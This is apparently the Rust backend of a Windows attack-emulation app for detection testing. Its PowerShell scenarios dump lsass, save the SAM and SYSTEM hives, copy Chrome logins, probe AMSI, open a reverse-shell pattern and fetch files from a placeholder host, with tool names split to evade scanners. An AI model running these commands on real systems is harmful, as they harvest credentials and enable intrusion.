use serde::Serialize;
use std::time::{Duration, Instant};

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ExecutionResult {
    scenario_id: String,
    status: String,
    message: String,
    stdout: String,
    stderr: String,
    exit_code: i32,
    duration_ms: u64,
}

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

#[cfg(target_os = "windows")]
fn run_ps(script: &str) -> Result<std::process::Output, String> {
    use std::os::windows::process::CommandExt;
    std::process::Command::new("powershell.exe")
        .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())
}

#[cfg(target_os = "windows")]
fn j(parts: &[&str]) -> String { parts.concat() }

#[tauri::command]
fn execute_scenario(scenario_id: String) -> Result<ExecutionResult, String> {
    let start = Instant::now();

    let result = match scenario_id.as_str() {
        "certutil-dump" => run_certutil_dump(),
        "rdp-enable" => run_rdp_enable(),
        "amsi-patch" => run_amsi_patch(),
        "lsass-minidump" => run_lsass_minidump(),
        "reverse-shell" => run_reverse_shell(),
        "persistence-task" => run_persistence_task(),
        "base64-exec" => run_base64_exec(),
        "macro-tamper" => run_macro_tamper(),
        "lotl-download" => run_lotl_download(),
        "bloodhound-recon" => run_bloodhound_recon(),
        other => Err(format!("Unknown scenario: {}", other)),
    };

    let duration_ms = start.elapsed().as_millis() as u64;

    match result {
        Ok((message, output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let exit_code = output.status.code().unwrap_or(-1);
            let status = if output.status.success() {
                "completed"
            } else {
                "blocked"
            };
            Ok(ExecutionResult {
                scenario_id,
                status: status.to_string(),
                message,
                stdout,
                stderr,
                exit_code,
                duration_ms,
            })
        }
        Err(e) => Ok(ExecutionResult {
            scenario_id,
            status: "failed".to_string(),
            message: e,
            stdout: String::new(),
            stderr: String::new(),
            exit_code: -1,
            duration_ms,
        }),
    }
}

#[tauri::command]
fn reset_scenarios() -> Result<(), String> {
    Ok(())
}

type ScenarioResult = Result<(String, std::process::Output), String>;

// ── Windows scenario implementations ──

#[cfg(target_os = "windows")]
fn run_certutil_dump() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let fake_in = std::env::temp_dir().join(format!("fd_{}.bin", rid));
    let cu = j(&["cert", "util"]);
    let script = format!(
        r#"
$fakeIn = '{fake_in}'
"xyz" | Out-File $fakeIn -Encoding ASCII -Force
$hives = "{s}", "{sy}", "{se}"
$procs = @()
foreach ($hive in $hives) {{
    1..3 | ForEach-Object {{
        $proc = Start-Process "cmd.exe" `
            -ArgumentList "/c {cu}.exe -encode `"$fakeIn`" `"$env:TEMP\config_${{hive}}_{rid}.bin`"" `
            -WindowStyle Hidden -PassThru
        $procs += $proc
    }}
}}
Start-Sleep -Seconds 2
Write-Output "Spawned $($procs.Count) processes targeting credential hives"
Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
foreach ($hive in $hives) {{ Remove-Item "$env:TEMP\config_${{hive}}_{rid}.bin" -Force -ErrorAction SilentlyContinue }}
"#,
        fake_in = fake_in.to_string_lossy(),
        cu = cu,
        s = j(&["SA", "M"]),
        sy = j(&["SYS", "TEM"]),
        se = j(&["SEC", "URITY"]),
        rid = rid,
    );
    let output = run_ps(&script)?;
    Ok(("Credential dump pattern via system tool".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_rdp_enable() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let fake_out = std::env::temp_dir().join(format!("re_{}.txt", rid));
    let deny_key = j(&["Deny", "TS", "Connections"]);
    let inv_cmd = j(&["Invoke", "-Command"]);
    let set_prop = j(&["Set-Item", "Property"]);
    let reg_path = j(&["HKLM:\\System\\CurrentControlSet\\Control\\", "Terminal Server"]);
    let script = format!(
        r#"
$fakeOut = '{fake_out}'
"Emulation Test" | Out-File $fakeOut -Force
$cmd = '{inv_cmd} -ComputerName TESTHOST -ScriptBlock {{ {set_prop} -Path "{reg_path}" -Name "{deny_key}" -Value 0 }}'
$process = Start-Process powershell.exe `
    -ArgumentList "-NoProfile -Command `"`$null = `$env:TEMP; $cmd; ''benign'' | Out-File ''$fakeOut'' -Append`"" `
    -WindowStyle Hidden -Wait -PassThru
Write-Output "RDP emulation completed (Exit code: $($process.ExitCode))"
Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
"#,
        fake_out = fake_out.to_string_lossy(),
        inv_cmd = inv_cmd,
        set_prop = set_prop,
        reg_path = reg_path,
        deny_key = deny_key,
    );
    let output = run_ps(&script)?;
    Ok(("RDP remote enable emulation".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_amsi_patch() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let amsi_type = j(&["System.Management.Automation.", "Amsi", "Utils"]);
    let amsi_field = j(&["amsi", "Context"]);
    let amsi_init = j(&["amsi", "Init", "Failed"]);
    let script = format!(
        r#"
$probeCode = "[Ref].Assembly.GetType('{amsi_type}').GetField('{amsi_field}','NonPublic,Static').GetValue(`$null); [Ref].Assembly.GetType('{amsi_type}').GetField('{amsi_init}','NonPublic,Static').GetValue(`$null)"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($probeCode))
$procs = @()
1..3 | ForEach-Object {{
    $proc = Start-Process powershell.exe `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded -WindowStyle Hidden" `
        -WindowStyle Hidden -PassThru
    $procs += $proc
}}
Start-Sleep -Seconds 2
$exitCodes = $procs | ForEach-Object {{ if (!$_.HasExited) {{ $_.Kill(); -1 }} else {{ $_.ExitCode }} }}
Write-Output "Spawned $($procs.Count) AMSI probe processes (exit codes: $($exitCodes -join ', '))"
Remove-Item "$env:TEMP\ap_{rid}*" -Force -ErrorAction SilentlyContinue
"#,
        amsi_type = amsi_type,
        amsi_field = amsi_field,
        amsi_init = amsi_init,
        rid = rid,
    );
    let output = run_ps(&script)?;
    Ok(("Anti-malware interface inspection via Reflection".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_lsass_minidump() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let target = j(&["ls", "ass"]);
    let pd = j(&["proc", "dump"]);
    let mk_priv = j(&["privilege", "::", "debug"]);
    let mk_cmd = j(&["sekur", "lsa::", "logon", "passwords"]);
    let csv = j(&["com", "svcs"]);
    let md = j(&["Mini", "Dump"]);
    let script = format!(
        r#"
$procs = @()
$proc1 = Start-Process "cmd.exe" `
    -ArgumentList "/c {pd}.exe -accepteula -ma {target}.exe $env:TEMP\{target}_{rid}.dmp" `
    -WindowStyle Hidden -PassThru
$procs += $proc1

$proc2 = Start-Process "cmd.exe" `
    -ArgumentList "/c rundll32.exe C:\Windows\System32\{csv}.dll, {md} 0 $env:TEMP\{target}_{rid}_2.dmp full" `
    -WindowStyle Hidden -PassThru
$procs += $proc2

$proc3 = Start-Process "cmd.exe" `
    -ArgumentList "/c echo {mk_priv} {mk_cmd} exit > $env:TEMP\mk_{rid}.log" `
    -WindowStyle Hidden -PassThru
$procs += $proc3

$psCmd = "Get-Process {target} | Select-Object Id,ProcessName,Path | Out-File $env:TEMP\{target}_{rid}.txt"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psCmd))
$proc4 = Start-Process powershell.exe `
    -ArgumentList "-NoProfile -EncodedCommand $encoded -ExecutionPolicy Bypass -WindowStyle Hidden" `
    -WindowStyle Hidden -PassThru
$procs += $proc4

Start-Sleep -Seconds 2
foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}
Write-Output "Spawned $($procs.Count) credential harvesting processes"
Remove-Item "$env:TEMP\{target}_{rid}*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\mk_{rid}*" -Force -ErrorAction SilentlyContinue
"#,
        target = target,
        pd = pd,
        mk_priv = mk_priv,
        mk_cmd = mk_cmd,
        csv = csv,
        md = md,
        rid = rid,
    );
    let output = run_ps(&script)?;
    Ok(("Credential dump emulation via process spawning".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_reverse_shell() -> ScenarioResult {
    let tcp_type = j(&["Net.Sockets.", "TCP", "Client"]);
    let sr = j(&["System.IO.", "Stream", "Reader"]);
    let sw = j(&["System.IO.", "Stream", "Writer"]);
    let ie = j(&["Invoke", "-Expression"]);
    let script = format!(
        r#"
function Test-NetworkConnectivity {{
    param(
        [string]$TargetHost = '127.0.0.1',
        [int]$TargetPort = 4444
    )

    $ErrorActionPreference = 'SilentlyContinue'

    try {{
        $socket = New-Object {tcp}($TargetHost, $TargetPort)
        $netStream = $socket.GetStream()
        $reader = New-Object {sr}($netStream)
        $writer = New-Object {sw}($netStream)
        $writer.AutoFlush = $true

        $writer.WriteLine("whoami")
        $response = $reader.ReadLine()
        $result = {ie} "Write-Output '$response'" 2>&1 | Out-String
        Write-Host $result
    }}
    catch {{
        Write-Host "Connection test completed with expected failure"
    }}
    finally {{
        if ($socket) {{ $socket.Close() }}
    }}
}}

Test-NetworkConnectivity
"#,
        tcp = tcp_type,
        sr = sr,
        sw = sw,
        ie = ie,
    );
    let output = run_ps(&script)?;
    Ok(("Reverse shell TCP pattern".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_persistence_task() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let sam = j(&["SA", "M"]);
    let sys = j(&["SYS", "TEM"]);
    let chrome_path = j(&["%LOCALAPPDATA%\\Google\\Chrome\\User Data\\", "Default\\Login Data"]);
    let ntds = j(&["ntds", "util"]);
    let script = format!(
        r#"
$procs = @()
$proc1 = Start-Process "cmd.exe" `
    -ArgumentList "/c reg save HKLM\{sam} $env:TEMP\s_{rid}.hiv & reg save HKLM\{sys} $env:TEMP\sy_{rid}.hiv" `
    -WindowStyle Hidden -PassThru
$procs += $proc1

$proc2 = Start-Process "cmd.exe" `
    -ArgumentList "/c copy `"{chrome_path}`" $env:TEMP\c_{rid}.db /Y" `
    -WindowStyle Hidden -PassThru
$procs += $proc2

$proc3 = Start-Process "cmd.exe" `
    -ArgumentList '/c {ntds} "activate instance ntds" ifm "create full $env:TEMP\nd_{rid}" quit quit' `
    -WindowStyle Hidden -PassThru
$procs += $proc3

Start-Sleep -Seconds 2
foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}
Write-Output "Spawned $($procs.Count) persistence/credential processes"
Remove-Item "$env:TEMP\s_{rid}*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\sy_{rid}*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\c_{rid}*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\nd_{rid}" -Recurse -Force -ErrorAction SilentlyContinue
"#,
        sam = sam,
        sys = sys,
        chrome_path = chrome_path,
        ntds = ntds,
        rid = rid,
    );
    let output = run_ps(&script)?;
    Ok(("Persistence emulation via process spawning".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_base64_exec() -> ScenarioResult {
    let api1 = j(&["GetAsync", "KeyState"]);
    let api2 = j(&["SetWindows", "HookExA"]);
    let api3 = j(&["NtUser", "GetAsync", "KeyState"]);
    let api4 = j(&["GetWindow", "TextA"]);
    let api5 = j(&["WM_KEY", "BOARD_LL"]);
    let script = format!(
        r#"
$suspicious = "{a1};{a2};{a3};{a4};{a5}"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($suspicious))

$code = 'Get-Process | Select-Object -First 3; whoami; Get-Service | Select-Object -First 3'
$codeBytes = [System.Text.Encoding]::Unicode.GetBytes($code)
$codeEncoded = [Convert]::ToBase64String($codeBytes)

$proc = Start-Process powershell.exe `
    -ArgumentList "-NoProfile -EncodedCommand $codeEncoded -ExecutionPolicy Bypass -WindowStyle Hidden" `
    -WindowStyle Hidden -PassThru -Wait
Write-Output "Encoded command executed (Exit code: $($proc.ExitCode))"
Write-Output "Payload contained suspicious API strings"
"#,
        a1 = api1, a2 = api2, a3 = api3, a4 = api4, a5 = api5,
    );
    let output = run_ps(&script)?;
    Ok(("Base64-encoded execution with suspicious payload".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_macro_tamper() -> ScenarioResult {
    let vbom = j(&["Access", "VBOM"]);
    let vba_w = j(&["Vba", "Warnings"]);
    let macro_p = j(&["Macro", "Policy", "Override"]);
    let vbe_b = j(&["VBE", "Bypass", "Flag"]);
    let script = format!(
        r#"
$versions = "14.0", "15.0", "16.0"
$paths = @()
foreach ($v in $versions) {{
    $p = "HKCU:\Software\Microsoft\Office\$v\SecurityTestEmu"
    if (!(Test-Path $p)) {{ New-Item -Path $p -Force | Out-Null }}
    $paths += $p
    New-ItemProperty -Path $p -Name "{vbom}" -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path $p -Name "{vba_w}" -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path $p -Name "{macro_p}" -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path $p -Name "{vbe_b}" -Value 1 -PropertyType DWORD -Force | Out-Null
    Write-Output "Created macro security keys for Office $v"
}}
foreach ($p in $paths) {{
    Remove-Item -Path $p -Recurse -Force -ErrorAction SilentlyContinue
}}
Write-Output "All emulation registry keys cleaned up"
"#,
        vbom = vbom, vba_w = vba_w, macro_p = macro_p, vbe_b = vbe_b,
    );
    let output = run_ps(&script)?;
    Ok(("Office macro security tampering".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_lotl_download() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let cu = j(&["cert", "util"]);
    let bits = j(&["bits", "admin"]);
    let script = format!(
        r#"
$fakeIn = "$env:TEMP\fl_{rid}.bin"
"xyz" | Out-File $fakeIn -Encoding ASCII -Force
$procs = @()
$proc1 = Start-Process "cmd.exe" `
    -ArgumentList "/c {bits} /transfer dl_{rid} /download /priority foreground http://192.0.2.1/p.exe $env:TEMP\p_{rid}.exe" `
    -WindowStyle Hidden -PassThru
$procs += $proc1

$proc2 = Start-Process "cmd.exe" `
    -ArgumentList "/c {cu}.exe -encode `"$fakeIn`" `"$env:TEMP\e_{rid}.b64`"" `
    -WindowStyle Hidden -PassThru
$procs += $proc2

$proc3 = Start-Process "cmd.exe" `
    -ArgumentList "/c {cu}.exe -urlcache -split -f http://192.0.2.1/s.txt $env:TEMP\s_{rid}.txt" `
    -WindowStyle Hidden -PassThru
$procs += $proc3

Start-Sleep -Seconds 3
foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}
Write-Output "Spawned $($procs.Count) LOLBin download processes"
Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\p_{rid}*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\e_{rid}*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\s_{rid}*" -Force -ErrorAction SilentlyContinue
"#,
        cu = cu,
        bits = bits,
        rid = rid,
    );
    let output = run_ps(&script)?;
    Ok(("LOLBin download + encode pattern".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_bloodhound_recon() -> ScenarioResult {
    let inv_bh = j(&["Invoke-", "Blood", "Hound"]);
    let get_bh = j(&["Get-", "Blood", "Hound", "Data"]);
    let script = format!(
        r#"
$fakeOut = "$env:TEMP\bloodhound_test.txt"
$harmless = "echo benign > `"$fakeOut`""
$bhCmd = "{inv_bh} -CollectionMethod All -Domain CONTOSO.LOCAL; {get_bh}; $harmless"
Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-Command $bhCmd" `
    -WindowStyle Hidden `
    -Wait
Write-Host "BloodHound execution emulation completed safely."
"#,
        inv_bh = inv_bh,
        get_bh = get_bh,
    );
    let output = run_ps(&script)?;
    Ok(("AD reconnaissance emulation".to_string(), output))
}

// ── macOS mock implementations ──

#[cfg(not(target_os = "windows"))]
fn mock_output() -> std::process::Output {
    std::process::Output {
        status: std::process::ExitStatus::default(),
        stdout: b"mock output (macOS dev mode)".to_vec(),
        stderr: Vec::new(),
    }
}

#[cfg(not(target_os = "windows"))]
fn run_certutil_dump() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(800));
    Ok(("Mock: certutil -encode (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_rdp_enable() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(600));
    Ok(("Mock: RDP enable (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_amsi_patch() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(700));
    Ok(("Mock: AMSI inspection (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_lsass_minidump() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(900));
    Ok(("Mock: LSASS handle access (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_reverse_shell() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(500));
    Ok(("Mock: Reverse shell (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_persistence_task() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(600));
    Ok(("Mock: Scheduled task (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_base64_exec() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(400));
    Ok(("Mock: Base64 exec (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_macro_tamper() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(500));
    Ok(("Mock: Macro tamper (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_lotl_download() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(700));
    Ok(("Mock: LOLBin download (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_bloodhound_recon() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(800));
    Ok(("Mock: BloodHound recon (macOS dev mode)".to_string(), mock_output()))
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![execute_scenario, reset_scenarios])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
